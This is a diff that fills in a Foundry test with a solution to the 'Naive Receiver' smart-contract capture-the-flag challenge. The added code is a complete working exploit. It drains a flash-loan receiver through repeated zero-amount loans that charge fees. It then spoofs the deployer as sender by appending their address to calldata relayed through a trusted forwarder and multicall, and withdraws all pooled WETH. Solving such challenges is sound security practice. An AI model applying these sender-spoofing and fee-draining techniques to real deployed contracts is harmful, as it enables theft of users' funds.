@@ -77,7 +77,46 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // Build multicall data
+        bytes[] memory calls = new bytes[](11);
+
+        // First 10 calls: drain receiver by forcing it to take flash loans
+        // Each flash loan costs 1 WETH in fees, draining receiver's 10 WETH
+        for (uint256 i = 0; i < 10; i++) {
+            calls[i] = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 0, ""));
+        }
+
+        // 11th call: withdraw all funds (1010 WETH) to recovery
+        // Trick: append deployer address to calldata so _msgSender() extracts it
+        calls[10] = abi.encodePacked(
+            abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            bytes20(deployer)
+        );
+
+        // Create forwarder request signed by player
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 3000000,
+            nonce: 0,
+            data: abi.encodeCall(pool.multicall, (calls)),
+            deadline: block.timestamp + 1 days
+        });
+
+        // Sign the request with player's private key
+        bytes32 requestHash = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Execute via forwarder
+        forwarder.execute(request, signature);
     }
 
     /**
